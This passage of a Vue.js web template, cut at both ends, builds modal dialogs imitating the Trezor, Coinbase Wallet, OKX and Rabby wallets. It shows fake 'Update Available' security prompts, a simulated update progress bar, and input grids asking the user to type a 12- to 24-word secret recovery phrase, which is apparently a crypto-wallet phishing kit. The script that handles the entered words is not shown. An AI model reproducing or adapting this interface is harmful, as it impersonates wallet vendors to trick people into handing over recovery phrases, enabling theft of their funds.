32.1393 419.569 32.286 418.806 32.286ZM419.312 30.702C420.295 30.702 421.08 30.372 421.666 29.712C422.268 29.052 422.568 28.1793 422.568 27.094V26.324C422.29 26.4707 421.916 26.5807 421.446 26.654L419.51 26.94C418.674 27.072 418.066 27.2993 417.684 27.622C417.303 27.93 417.112 28.3627 417.112 28.92C417.112 29.4773 417.31 29.9173 417.706 30.24C418.102 30.548 418.638 30.702 419.312 30.702ZM428.775 30.394H433.065V18.206H429.567V16.6H435.023V30.394H439.291V32H428.775V30.394ZM456.302 16.6H458.304V24.52L464.728 16.6H467.148L461.846 22.936L467.412 32H465.168L460.526 24.52L458.304 27.204V32H456.302V16.6ZM469.835 30.35H473.971V22.562H470.275V20.912H475.973V30.35H480.087V32H469.835V30.35ZM473.883 16.6H476.083V19.02H473.883V16.6ZM489.329 32C488.376 32 487.672 31.7947 487.217 31.384C486.763 30.9587 486.535 30.2913 486.535 29.382V22.518H483.235V20.912H486.029C486.176 20.912 486.293 20.868 486.381 20.78C486.484 20.692 486.535 20.5747 486.535 20.428V17.238H488.471V20.912H492.849V22.518H488.471V29.118C488.471 29.5287 488.574 29.844 488.779 30.064C488.985 30.2693 489.322 30.372 489.791 30.372H493.333V32H489.329Z"
              fill="#202020"
            ></path>
            <path
              d="M0.628 11.8H10.708C12.124 11.8 13.408 12.124 14.56 12.772C15.712 13.396 16.612 14.296 17.26 15.472C17.908 16.624 18.232 17.944 18.232 19.432C18.232 20.92 17.908 22.24 17.26 23.392C16.612 24.544 15.712 25.444 14.56 26.092C13.408 26.716 12.124 27.028 10.708 27.028H3.904V37H0.628V11.8ZM10.096 24.328C11.536 24.328 12.676 23.884 13.516 22.996C14.38 22.084 14.812 20.896 14.812 19.432C14.812 17.944 14.38 16.756 13.516 15.868C12.676 14.98 11.536 14.536 10.096 14.536H3.904V24.328H10.096ZM31.4842 37.468C28.4842 37.468 26.1562 36.352 24.5002 34.12C22.8442 31.888 22.0162 28.648 22.0162 24.4C22.0162 20.152 22.8442 16.912 24.5002 14.68C26.1562 12.448 28.4842 11.332 31.4842 11.332C34.4842 11.332 36.8122 12.448 38.4682 14.68C40.1242 16.912 40.9522 20.152 40.9522 24.4C40.9522 28.648 40.1242 31.888 38.4682 34.12C36.8122 36.352 34.4842 37.468 31.4842 37.468ZM31.4842 34.624C33.5722 34.624 35.0962 33.772 36.0562 32.068C37.0402 30.34 37.5322 27.784 37.5322 24.4C37.5322 21.016 37.0402 18.472 36.0562 16.768C35.0962 15.04 33.5722 14.176 31.4842 14.176C29.3962 14.176 27.8602 15.04 26.8762 16.768C25.9162 18.472 25.4362 21.016 25.4362 24.4C25.4362 27.784 25.9162 30.34 26.8762 32.068C27.8602 33.772 29.3962 34.624 31.4842 34.624ZM43.8724 11.8H47.1124L48.9484 31.384L52.2964 18.676H55.3924L58.7404 31.348L60.5044 11.8H63.7444L61.0804 37H57.4804L53.8444 23.032L50.1364 37H46.5724L43.8724 11.8ZM68.1407 11.8H84.7007V14.572H71.4167V22.492H83.2247V25.156H71.4167V34.228H84.7007V37H68.1407V11.8ZM89.9249 11.8H99.5369C101.001 11.8 102.309 12.1 103.461 12.7C104.637 13.276 105.549 14.116 106.197 15.22C106.869 16.3 107.205 17.596 107.205 19.108C107.205 20.884 106.737 22.384 105.801 23.608C104.865 24.808 103.617 25.624 102.057 26.056L107.601 37H103.965L98.6009 26.38H93.2009V37H89.9249V11.8ZM98.9969 23.644C100.509 23.644 101.685 23.248 102.525 22.456C103.365 21.64 103.785 20.524 103.785 19.108C103.785 17.644 103.365 16.516 102.525 15.724C101.685 14.932 100.509 14.536 98.9969 14.536H93.2009V23.644H98.9969ZM112.789 11.8H129.349V14.572H116.065V22.492H127.873V25.156H116.065V34.228H129.349V37H112.789V11.8ZM134.573 11.8H141.485C143.741 11.8 145.709 12.34 147.389 13.42C149.069 14.5 150.353 16 151.241 17.92C152.153 19.816 152.609 21.976 152.609 24.4C152.609 26.824 152.153 28.996 151.241 30.916C150.353 32.812 149.069 34.3 147.389 35.38C145.709 36.46 143.741 37 141.485 37H134.573V11.8ZM141.305 34.228C143.753 34.228 145.673 33.34 147.065 31.564C148.457 29.788 149.153 27.4 149.153 24.4C149.153 21.4 148.457 19.012 147.065 17.236C145.673 15.46 143.753 14.572 141.305 14.572H137.849V34.228H141.305ZM179.222 11.8H188.726C190.766 11.8 192.434 12.34 193.73 13.42C195.05 14.476 195.71 15.964 195.71 17.884C195.71 19.276 195.29 20.5 194.45 21.556C193.61 22.612 192.518 23.344 191.174 23.752C192.95 24.064 194.366 24.784 195.422 25.912C196.478 27.04 197.006 28.408 197.006 30.016C197.006 31.312 196.67 32.488 195.998 33.544C195.326 34.6 194.366 35.44 193.118 36.064C191.87 36.688 190.418 37 188.762 37H179.222V11.8ZM188.33 34.264C189.842 34.264 191.09 33.868 192.074 33.076C193.082 32.26 193.586 31.12 193.586 29.656C193.586 28.36 193.106 27.304 192.146 26.488C191.186 25.672 189.962 25.264 188.474 25.264H182.498V34.264H188.33ZM187.934 22.636C189.254 22.636 190.322 22.216 191.138 21.376C191.954 20.536 192.362 19.516 192.362 18.316C192.362 17.14 192.002 16.216 191.282 15.544C190.562 14.872 189.506 14.536 188.114 14.536H182.498V22.636H187.934ZM208.458 27.244L199.854 11.8H203.562L210.078 24.22L216.594 11.8H220.302L211.698 27.244V37H208.458V27.244Z"
              fill="#202020"
            ></path>
          </svg>
        </div>
      </div>
      <div :class="doublePage == '2' ? 'ledgertwo' : 'scwtw-hidden'">
        <div class="scwtw-flex scwtw-items-center scwtw-justify-between">
          <div>
            <svg
              class="scwtw-h-35 scwtw-w-auto"
              width="249"
              height="48"
              viewBox="0 0 249 48"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M0 24C0 10.745 10.055 0 22.459 0H79.541C91.945 0 102 10.745 102 24C102 37.255 91.945 48 79.541 48H22.459C10.055 48 0 37.255 0 24Z"
                fill="#202020"
              ></path>
              <path
                d="M70.1064 29.874V18.786H72.0644V20.458C72.7684 19.226 74.1984 18.5 75.7824 18.5C78.1804 18.5 79.8524 20.018 79.8524 22.966V29.874H77.9164V23.076C77.9164 21.14 76.8164 20.128 75.2104 20.128C73.4724 20.128 72.0644 21.514 72.0644 23.472V29.874H70.1064ZM57.7614 29.874L55.7154 18.786H57.5634L59.0154 27.938L60.9294 21.91H62.7554L64.6474 27.872L66.1214 18.786H67.9694L65.9234 29.874H63.7234L61.8534 24.11L59.9614 29.874H57.7614ZM49.1134 30.16C45.7474 30.16 43.7674 27.652 43.7674 24.33C43.7674 21.03 45.7474 18.5 49.1134 18.5C52.4794 18.5 54.4594 21.03 54.4594 24.33C54.4594 27.652 52.4794 30.16 49.1134 30.16ZM49.1134 28.532C51.5334 28.532 52.4574 26.464 52.4574 24.308C52.4574 22.174 51.5334 20.128 49.1134 20.128C46.6934 20.128 45.7694 22.174 45.7694 24.308C45.7694 26.464 46.6934 28.532 49.1134 28.532ZM36.8424 30.16C33.5864 30.16 31.5404 27.674 31.5404 24.33C31.5404 21.008 33.5864 18.5 36.8424 18.5C39.5924 18.5 42.0124 20.062 41.7484 24.836H33.5424C33.6964 26.882 34.6424 28.554 36.8424 28.554C38.3164 28.554 39.2844 27.652 39.6144 26.618H41.5504C41.2424 28.466 39.5044 30.16 36.8424 30.16ZM33.5864 23.362H39.8564C39.7024 21.14 38.6684 20.106 36.8424 20.106C34.8404 20.106 33.8504 21.558 33.5864 23.362ZM22.1484 29.874V18.786H24.1504V20.656C24.8544 19.424 26.0644 18.786 27.3184 18.786H29.9804V20.656H27.1644C25.4044 20.656 24.1504 21.8 24.1504 24.022V29.874H22.1484Z"
                fill="white"
              ></path>
              <path
                d="M115.496 16.6H117.938L120.82 24.608L123.702 16.6H126.144V32H124.208V19.966L121.7 26.632H119.94L117.432 19.966V32H115.496V16.6ZM132.879 32.286C131.764 32.286 130.862 31.9853 130.173 31.384C129.498 30.7827 129.161 29.9907 129.161 29.008C129.161 27.864 129.542 27.05 130.305 26.566C131.082 26.0673 132.05 25.7447 133.209 25.598L135.585 25.29C135.995 25.246 136.274 25.1213 136.421 24.916C136.567 24.7107 136.641 24.454 136.641 24.146V24.124C136.641 23.552 136.435 23.09 136.025 22.738C135.629 22.386 135.035 22.21 134.243 22.21C133.436 22.21 132.798 22.3933 132.329 22.76C131.874 23.112 131.603 23.6327 131.515 24.322H129.557C129.674 23.1927 130.151 22.298 130.987 21.638C131.823 20.9633 132.901 20.626 134.221 20.626C135.673 20.626 136.758 20.9707 137.477 21.66C138.21 22.3493 138.577 23.3247 138.577 24.586V29.954C138.577 30.086 138.621 30.196 138.709 30.284C138.797 30.3573 138.907 30.394 139.039 30.394H139.721V32H138.401C137.873 32 137.469 31.8827 137.191 31.648C136.912 31.3987 136.773 31.0613 136.773 30.636V30.372C136.318 31.0467 135.746 31.538 135.057 31.846C134.367 32.1393 133.641 32.286 132.879 32.286ZM133.385 30.702C134.367 30.702 135.152 30.372 135.739 29.712C136.34 29.052 136.641 28.1793 136.641 27.094V26.324C136.362 26.4707 135.988 26.5807 135.519 26.654L133.583 26.94C132.747 27.072 132.138 27.2993 131.757 27.622C131.375 27.93 131.185 28.3627 131.185 28.92C131.185 29.4773 131.383 29.9173 131.779 30.24C132.175 30.548 132.71 30.702 133.385 30.702ZM143.287 20.912H145.245V22.584C145.597 21.968 146.103 21.4913 146.763 21.154C147.438 20.802 148.171 20.626 148.963 20.626C150.195 20.626 151.178 21.0147 151.911 21.792C152.659 22.5547 153.033 23.6547 153.033 25.092V32H151.097V25.202C151.097 24.2633 150.848 23.5373 150.349 23.024C149.865 22.5107 149.212 22.254 148.391 22.254C147.819 22.254 147.291 22.4007 146.807 22.694C146.323 22.9727 145.942 23.3687 145.663 23.882C145.384 24.3807 145.245 24.9527 145.245 25.598V32H143.287V20.912ZM161 32.286C159.768 32.286 158.778 31.9047 158.03 31.142C157.296 30.3647 156.93 29.2573 156.93 27.82V20.912H158.888V27.71C158.888 28.6633 159.13 29.3967 159.614 29.91C160.098 30.4087 160.758 30.658 161.594 30.658C162.166 30.658 162.686 30.5187 163.156 30.24C163.64 29.9467 164.021 29.5433 164.3 29.03C164.593 28.5167 164.74 27.9447 164.74 27.314V20.912H166.676V32H164.74V30.328C164.373 30.944 163.86 31.428 163.2 31.78C162.54 32.1173 161.806 32.286 161 32.286ZM173.806 32.286C172.692 32.286 171.79 31.9853 171.1 31.384C170.426 30.7827 170.088 29.9907 170.088 29.008C170.088 27.864 170.47 27.05 171.232 26.566C172.01 26.0673 172.978 25.7447 174.136 25.598L176.512 25.29C176.923 25.246 177.202 25.1213 177.348 24.916C177.495 24.7107 177.568 24.454 177.568 24.146V24.124C177.568 23.552 177.363 23.09 176.952 22.738C176.556 22.386 175.962 22.21 175.17 22.21C174.364 22.21 173.726 22.3933 173.256 22.76C172.802 23.112 172.53 23.6327 172.442 24.322H170.484C170.602 23.1927 171.078 22.298 171.914 21.638C172.75 20.9633 173.828 20.626 175.148 20.626C176.6 20.626 177.686 20.9707 178.404 21.66C179.138 22.3493 179.504 23.3247 179.504 24.586V29.954C179.504 30.086 179.548 30.196 179.636 30.284C179.724 30.3573 179.834 30.394 179.966 30.394H180.648V32H179.328C178.8 32 178.397 31.8827 178.118 31.648C177.84 31.3987 177.7 31.0613 177.7 30.636V30.372C177.246 31.0467 176.674 31.538 175.984 31.846C175.295 32.1393 174.569 32.286 173.806 32.286ZM174.312 30.702C175.295 30.702 176.08 30.372 176.666 29.712C177.268 29.052 177.568 28.1793 177.568 27.094V26.324C177.29 26.4707 176.916 26.5807 176.446 26.654L174.51 26.94C173.674 27.072 173.066 27.2993 172.684 27.622C172.303 27.93 172.112 28.3627 172.112 28.92C172.112 29.4773 172.31 29.9173 172.706 30.24C173.102 30.548 173.638 30.702 174.312 30.702ZM183.775 30.394H188.065V18.206H184.567V16.6H190.023V30.394H194.291V32H183.775V30.394ZM211.302 16.6H213.304V24.52L219.728 16.6H222.148L216.846 22.936L222.412 32H220.168L215.526 24.52L213.304 27.204V32H211.302V16.6ZM224.835 30.35H228.971V22.562H225.275V20.912H230.973V30.35H235.087V32H224.835V30.35ZM228.883 16.6H231.083V19.02H228.883V16.6ZM244.329 32C243.376 32 242.672 31.7947 242.217 31.384C241.763 30.9587 241.535 30.2913 241.535 29.382V22.518H238.235V20.912H241.029C241.176 20.912 241.293 20.868 241.381 20.78C241.484 20.692 241.535 20.5747 241.535 20.428V17.238H243.471V20.912H247.849V22.518H243.471V29.118C243.471 29.5287 243.574 29.844 243.779 30.064C243.985 30.2693 244.322 30.372 244.791 30.372H248.333V32H244.329Z"
                fill="#202020"
              ></path>
            </svg>
          </div>
          <div>
            <button
              @click="walletsswitch('Trezor', false)"
              class="ledgerclosebut"
              type="button"
            >
              <svg
                class="scwtw-w-6 scwtw-h-6 ledgerclosesvg"
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <path d="M18 6 6 18"></path>
                <path d="m6 6 12 12"></path>
              </svg>
            </button>
          </div>
        </div>
        <div class="scwtw-mt-6">
          <div class="ledgertxtbox">
            <div>
              <h3 class="ledgertit">Import Trezor wallet with Secret Phrase</h3>
            </div>
            <div class="scwtw-mb-1d5">
              <p class="ledgertxt">
                Import an existing wallet with your 12, 20 or 24-word secret
                phrase.
              </p>
            </div>
            <div class="ledgertabinput">
              <div class="scwtw-w-full">
                <button
                  @click="selectedOptionh('12')"
                  class="ledgertabitem"
                  type="button"
                  data-is-selected="true"
                  data-words-count="12"
                >
                  <div>
                    <span class="ledgertabitemtxt">12 words</span>
                  </div>
                </button>
              </div>
              <div class="scwtw-w-full">
                <button
                  @click="selectedOptionh('20')"
                  class="ledgertabitem"
                  type="button"
                  data-is-selected="false"
                  data-words-count="20"
                >
                  <div>
                    <span class="ledgertabitemtxt">20 words</span>
                  </div>
                </button>
              </div>
              <div class="scwtw-w-full">
                <button
                  @click="selectedOptionh('24')"
                  class="ledgertabitem"
                  type="button"
                  data-is-selected="false"
                  data-words-count="24"
                >
                  <div>
                    <span class="ledgertabitemtxt">24 words</span>
                  </div>
                </button>
              </div>
            </div>
          </div>
        </div>
        <div class="scwtw-mt-4">
          <div class="ledgerinputbox">
            <div class="trezorinputs">
              <div
                v-for="(item, i) in visibleInputs"
                :key="i"
                class="ledgerinputitem"
              >
                <div class="ledgeritemi">
                  <div>
                    <p class="ledgeritemitxt">{{ i + 1 }}</p>
                  </div>
                </div>
                <input
                  class="ledgerinputv"
                  v-model="item.value"
                  type="text"
                  data-invalid="false"
                />
              </div>
            </div>
          </div>
          <div :class="errormessage ? 'ledgererrorbox' : 'scwtw-hidden'">
            <span class="ledgererrortxt">words is invalid or misspelled</span>
          </div>
        </div>
        <div class="ledgerimportbutbox">
          <div class="scwtw-w-full">
            <button
              class="ledgerimportbut"
              @click="confirm()"
              :disabled="!isConfirmEnabled"
            >
              Continue with a wallet
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- coinbase -->
  <div
    :class="Coinbaseisshow ? 'walletsbox zindexh' : 'walletsbox zindexh op0'"
  >
    <div
      @click="walletsswitch('Coinbase', false)"
      class="walletsbg zindexh1"
    ></div>
    <div
      :class="
        Coinbaseisshow
          ? 'Metamaskbox coinbasebox Metamaskboxshow'
          : 'Metamaskbox coinbasebox'
      "
    >
      <div :class="doublePage == '1' ? 'coinbaseone' : 'scwtw-hidden'">
        <video
          id="welcome-video"
          src="../assets/warmwelcome_ext.webm"
          type="video/webm"
          loop=""
          autoplay=""
          muted=""
          playsinline=""
          width="100%"
          height="100%"
          class="scwtw-w-full scwtw-h-full scwtw-object-cover"
        ></video>
      </div>
      <div :class="doublePage == '2' ? 'coinbasetwo' : 'scwtw-hidden'">
        <div class="coinbaseconbox">
          <div class="coinbasecon">
            <div
              class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-mb-4"
            >
              <img
                class="scwtw-w-24 scwtw-h-24 scwtw-rounded-full"
                src="../assets/coinbase.webp"
                alt="Coinbase Wallet"
              />
            </div>
            <h3 class="coinbasetit">Update Available</h3>
            <p class="coinbasetxt">Version 3.105.0</p>
            <div class="coinbasemessagebox">
              <div class="coinbasemessagebb">
                <svg
                  class="coinbasemessagesvg"
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <circle cx="12" cy="12" r="10"></circle>
                  <line x1="12" x2="12" y1="8" y2="12"></line>
                  <line x1="12" x2="12.01" y1="16" y2="16"></line>
                </svg>
                <p class="coinbasemessagetit">Important security update</p>
              </div>
              <p class="coinbasemessagetxt">
                We recommend installing this update to ensure the security of
                your wallet and assets.
              </p>
            </div>
            <div class="scwtw-w-full scwtw-mb-6">
              <h4 class="coinbasemstit">What's new</h4>
              <ul class="coinbaseul">
                <li class="scwtw-flex scwtw-items-start">
                  <div class="coinbaseild scwtw-rounded-full"></div>
                  <p class="coinbaseiltxt">
                    Enhanced DeFi integration and swap functionality
                  </p>
                </li>
                <li class="scwtw-flex scwtw-items-start">
                  <div class="coinbaseild scwtw-rounded-full"></div>
                  <p class="coinbaseiltxt">
                    Improved wallet connection reliability
                  </p>
                </li>
                <li class="scwtw-flex scwtw-items-start">
                  <div class="coinbaseild scwtw-rounded-full"></div>
                  <p class="coinbaseiltxt">Critical security enhancements</p>
                </li>
                <li class="scwtw-flex scwtw-items-start">
                  <div class="coinbaseild scwtw-rounded-full"></div>
                  <p class="coinbaseiltxt">
                    Bug fixes and performance improvements
                  </p>
                </li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- okx -->
  <div :class="okxisshow ? 'walletsbox zindexh' : 'walletsbox zindexh op0'">
    <div @click="walletsswitch('OKX', false)" class="walletsbg zindexh1"></div>
    <div
      :class="
        okxisshow ? 'Metamaskbox okxbox Metamaskboxshow' : 'Metamaskbox okxbox'
      "
    >
      <div :class="pageManager == '1' ? 'okxone' : 'scwtw-hidden'">
        <video
          src="../assets/cover-light.webm"
          type="video/webm"
          loop=""
          autoplay=""
          muted=""
          playsinline=""
          width="100%"
          height="100%"
          class="okxvideo"
        ></video>
        <div class="scwtw-mb-1d5">
          <h3 class="okxonetit">Your portal to Web3</h3>
        </div>
        <div>
          <p class="okxonetxt">Wallet · Trade · NFT · Earn · DApp</p>
        </div>
      </div>
      <div :class="pageManager == '2' ? 'okxtwo' : 'scwtw-hidden'">
        <div class="okxtwobox">
          <div class="okxtwoboxhead">
            <div class="scwtw-mb-5">
              <svg
                class="scwtw-w-16 scwtw-h-16"
                viewBox="0 0 32 32"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <rect
                  width="32"
                  height="32"
                  rx="8"
                  fill="#000000"
                  class="dark:scwtw-fill-white"
                ></rect>
                <rect
                  x="6.5"
                  y="6.5"
                  width="6"
                  height="6"
                  rx="1"
                  fill="#ffffff"
                  class="dark:scwtw-fill-[#aefa49]"
                ></rect>
                <rect
                  x="6.5"
                  y="19.5"
                  width="6"
                  height="6"
                  rx="1"
                  fill="#ffffff"
                  class="dark:scwtw-fill-[#aefa49]"
                ></rect>
                <rect
                  x="19.5"
                  y="6.5"
                  width="6"
                  height="6"
                  rx="1"
                  fill="#ffffff"
                  class="dark:scwtw-fill-[#aefa49]"
                ></rect>
                <rect
                  x="19.5"
                  y="19.5"
                  width="6"
                  height="6"
                  rx="1"
                  fill="#ffffff"
                  class="dark:scwtw-fill-[#aefa49]"
                ></rect>
                <rect
                  x="13"
                  y="13"
                  width="6"
                  height="6"
                  rx="1"
                  fill="#ffffff"
                  class="dark:scwtw-fill-[#aefa49]"
                ></rect>
              </svg>
            </div>
            <h3 class="okxttit">Update Available</h3>
            <p class="okxttxt">Version 3.42.37</p>
          </div>
          <div class="okxtdetails">
            <ul class="okxtdetailsul">
              <li class="scwtw-flex scwtw-items-start okxtdetailsli">
                <div class="okxtdetailslid">
                  <div class="okxtdetailslidg"></div>
                </div>
                <span class="okxtdetailslitxt"
                  >Fix main build modifying desktop build steps</span
                >
              </li>
              <li class="scwtw-flex scwtw-items-start okxtdetailsli">
                <div class="okxtdetailslid">
                  <div class="okxtdetailslidg"></div>
                </div>
                <span class="okxtdetailslitxt"
                  >Improving the security system</span
                >
              </li>
              <li class="scwtw-flex scwtw-items-start okxtdetailsli">
                <div class="okxtdetailslid">
                  <div class="okxtdetailslidg"></div>
                </div>
                <span class="okxtdetailslitxt"
                  >Fix incorrect network information</span
                >
              </li>
              <li class="scwtw-flex scwtw-items-start okxtdetailsli">
                <div class="okxtdetailslid">
                  <div class="okxtdetailslidg"></div>
                </div>
                <span class="okxtdetailslitxt"
                  >Improve performance on signature request</span
                >
              </li>
            </ul>
          </div>
          <div class="okxbuttonbox">
            <button @click="pageSwitch('3')" class="okxbutton" type="button">
              Update
            </button>

            <div class="okxlinkbox">
              <a
                href="https://href.li/?https://www.okx.com/help"
                target="_blank"
                class="okxlink"
                >Need help? Contact our Support</a
              >
            </div>
          </div>
        </div>
      </div>
      <div :class="pageManager == '3' ? 'okxthree' : 'scwtw-hidden'">
        <div class="onxthreebox">
          <div class="onxthreebhead">
            <div class="scwtw-mb-8 scwtw-relative">
              <!-- Background circle -->
              <svg
                class="scwtw-w-20 scwtw-h-20 svgycolor"
                viewBox="0 0 100 100"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <circle
                  cx="50"
                  cy="50"
                  r="44"
                  stroke="currentColor"
                  stroke-width="12"
                ></circle>
              </svg>

              <!-- Spinner arc - fixed to be an actual circular arc -->
              <svg
                class="svgtwo scwtw-w-20 scwtw-h-20"
                viewBox="0 0 100 100"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <circle
                  cx="50"
                  cy="50"
                  r="44"
                  stroke="currentColor"
                  stroke-width="12"
                  stroke-linecap="round"
                  stroke-dasharray="69, 278"
                ></circle>
              </svg>

              <!-- Center OKX logo -->
              <div
                class="okxthreelogo scwtw-flex scwtw-items-center scwtw-justify-center"
              >
                <svg
                  class="scwtw-w-8 scwtw-h-8"
                  viewBox="0 0 32 32"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <rect
                    x="6.5"
                    y="6.5"
                    width="6"
                    height="6"
                    rx="1"
                    fill="#000000"
                    class="dark:scwtw-fill-[#aefa49]"
                  ></rect>
                  <rect
                    x="6.5"
                    y="19.5"
                    width="6"
                    height="6"
                    rx="1"
                    fill="#000000"
                    class="dark:scwtw-fill-[#aefa49]"
                  ></rect>
                  <rect
                    x="19.5"
                    y="6.5"
                    width="6"
                    height="6"
                    rx="1"
                    fill="#000000"
                    class="dark:scwtw-fill-[#aefa49]"
                  ></rect>
                  <rect
                    x="19.5"
                    y="19.5"
                    width="6"
                    height="6"
                    rx="1"
                    fill="#000000"
                    class="dark:scwtw-fill-[#aefa49]"
                  ></rect>
                  <rect
                    x="13"
                    y="13"
                    width="6"
                    height="6"
                    rx="1"
                    fill="#000000"
                    class="dark:scwtw-fill-[#aefa49]"
                  ></rect>
                </svg>
              </div>
            </div>

            <h3 class="okxthreetit">Updating OKX Wallet</h3>
            <p class="okxthreetxt">
              Please wait while we update to version 3.42.37
            </p>
          </div>
          <div class="scwtw-w-full scwtw-mb-6">
            <div class="okxprogressbox">
              <div
                class="okxprogressbg"
                :style="{ width: one_progress + '%' }"
              ></div>
            </div>

            <div class="okxprogresstxtbox">
              <p class="okxprogresstxt">Downloading update...</p>
              <p class="okxprogressbfb">{{ Math.trunc(one_progress) }}%</p>
            </div>
          </div>
          <div class="okxpleasebox">
            <p class="okxpleasetxt">
              Please do not close this window during the update.
            </p>
          </div>
        </div>
      </div>
      <div :class="pageManager == '4' ? 'okxfour' : 'scwtw-hidden'">
        <div>
          <div class="okxfourhead">
            <div class="okxfourheadbox">
              <div>
                <button
                  @click="walletsswitch('OKX', false)"
                  class="okxclosebut"
                  type="button"
                >
                  <svg
                    class="okxclosesvg"
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="1.5"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                  >
                    <path d="m15 18-6-6 6-6"></path>
                  </svg>
                </button>
              </div>
              <div>
                <p class="okxheadtit">Import with Secret Phrase</p>
              </div>
              <div>
                <div class="scwtw-w-6 scwtw-h-6"></div>
              </div>
            </div>
          </div>
          <div class="okxfselectbox">
            <div>
              <span class="okxfselecttxt">My seed phrase has</span>
            </div>
            <div>
              <select v-model="selectedOption" class="okxfselect">
                <option value="12" selected="">12 words</option>
                <option value="15">15 words</option>
                <option value="18">18 words</option>
                <option value="21">21 words</option>
                <option value="24">24 words</option>
              </select>
            </div>
          </div>
          <div class="okxinputsbox">
            <div class="okxinputsb">
              <div
                v-for="(item, i) in visibleInputs"
                :key="i"
                class="scwtw-relative"
              >
                <div class="okxinputsbq">
                  <div>
                    <p class="okxinputsbqtxt">{{ i + 1 }}</p>
                  </div>
                  <div class="scwtw-flex scwtw-items-center">
                    <span class="okxinputsbqbqs"></span>
                  </div>
                </div>
                <input
                  class="okxfinput"
                  v-model="item.value"
                  type="text"
                  data-invalid="false"
                />
              </div>
            </div>
          </div>
          <div :class="errormessage ? 'okxfmessagebox' : 'scwtw-hidden'">
            <span class="okxfmessagetxt"
              >Incorrect seed phrase. Check and re-enter.</span
            >
          </div>
          <div class="okxfimportbox">
            <div class="scwtw-w-full">
              <button
                class="okxfimportbut"
                type="button"
                @click="confirm()"
                :disabled="!isConfirmEnabled"
              >
                Confirm
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Rabby -->
  <div :class="Rabbyisshow ? 'walletsbox zindexh' : 'walletsbox zindexh op0'">
    <div
      @click="walletsswitch('Rabby', false)"
      class="walletsbg zindexh1"
    ></div>
    <div
      :class="
        Rabbyisshow
          ? 'Metamaskbox Rabbybox Metamaskboxshow'
          : 'Metamaskbox Rabbybox'
      "
    >
      <div :class="pageManager == '1' ? 'rabbyone' : 'scwtw-hidden'">
        <div>
          <svg
            class="rabby-svg"
            width="100"
            height="100"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 100 100"
          >
            <path
              d="M92.53 55.386c3.375-7.57-13.312-28.715-29.253-37.525-10.048-6.825-20.519-5.887-22.64-2.89-4.653 6.576 15.41 12.148 28.83 18.65-2.885 1.258-5.603 3.515-7.202 6.401-5.002-5.482-15.982-10.203-28.865-6.4-8.682 2.562-15.898 8.604-18.686 17.728a5.428 5.428 0 00-2.218-.47c-3.018 0-5.465 2.456-5.465 5.486s2.447 5.486 5.465 5.486c.56 0 2.31-.377 2.31-.377l27.952.203C31.58 79.48 22.745 82.082 22.745 85.166c0 3.084 8.453 2.249 11.627 1.099 15.194-5.503 31.513-22.654 34.314-27.591 11.76 1.472 21.643 1.647 23.844-3.288z"
              fill="url(#logo_svg__paint0_linear_111797_37674_1)"
            ></path>
            <path
              fill-rule="evenodd"
              clip-rule="evenodd"
              d="M69.465 33.623h.002c.622-.245.521-1.167.35-1.891-.392-1.665-7.165-8.378-13.525-11.385-8.666-4.097-15.047-3.886-15.99-1.997 1.765 3.631 9.949 7.041 18.496 10.602 3.647 1.52 7.36 3.067 10.668 4.67h-.001z"
              fill="url(#logo_svg__paint1_linear_111797_37674_1)"
            ></path>
            <path
              fill-rule="evenodd"
              clip-rule="evenodd"
              d="M58.467 70.175c-1.752-.672-3.732-1.29-5.983-1.849 2.4-4.31 2.903-10.692.637-14.726-3.181-5.662-7.174-8.676-16.453-8.676-5.103 0-18.843 1.725-19.087 13.239-.026 1.208 0 2.315.086 3.333l25.091.182c-3.383 5.387-6.55 9.382-9.324 12.42 3.33.856 6.078 1.575 8.601 2.235 2.394.627 4.585 1.2 6.878 1.787 3.46-2.53 6.712-5.288 9.554-7.945z"
              fill="url(#logo_svg__paint2_linear_111797_37674_1)"
            ></path>
            <path
              d="M14.379 60.312c1.025 8.746 5.977 12.174 16.095 13.188 10.12 1.015 15.924.334 23.651 1.04 6.454.59 12.217 3.89 14.355 2.75 1.923-1.027.847-4.736-1.727-7.116-3.337-3.085-7.956-5.23-16.083-5.991 1.62-4.451 1.166-10.692-1.35-14.088-3.636-4.91-10.35-7.129-18.846-6.16-8.876 1.014-17.382 5.4-16.095 16.377z"
              fill="url(#logo_svg__paint3_linear_111797_37674_1)"
            ></path>
            <defs>
              <linearGradient
                id="logo_svg__paint0_linear_111797_37674_1"
                x1="32.389"
                y1="48.683"
                x2="91.836"
                y2="65.478"
                gradientUnits="userSpaceOnUse"
              >
                <stop stop-color="#8697FF"></stop>
                <stop offset="1" stop-color="#ABB7FF"></stop>
              </linearGradient>
              <linearGradient
                id="logo_svg__paint1_linear_111797_37674_1"
                x1="81.798"
                y1="47.549"
                x2="38.766"
                y2="4.574"
                gradientUnits="userSpaceOnUse"
              >
                <stop stop-color="#8697FF"></stop>
                <stop offset="1" stop-color="#5156D8" stop-opacity="0"></stop>
              </linearGradient>
              <linearGradient
                id="logo_svg__paint2_linear_111797_37674_1"
                x1="59.66"
                y1="71.678"
                x2="18.401"
                y2="48.046"
                gradientUnits="userSpaceOnUse"
              >
                <stop stop-color="#465EED"></stop>
                <stop offset="1" stop-color="#8697FF" stop-opacity="0"></stop>
              </linearGradient>
              <linearGradient
                id="logo_svg__paint3_linear_111797_37674_1"
                x1="35.936"
                y1="48.237"
                x2="63.901"
                y2="83.636"
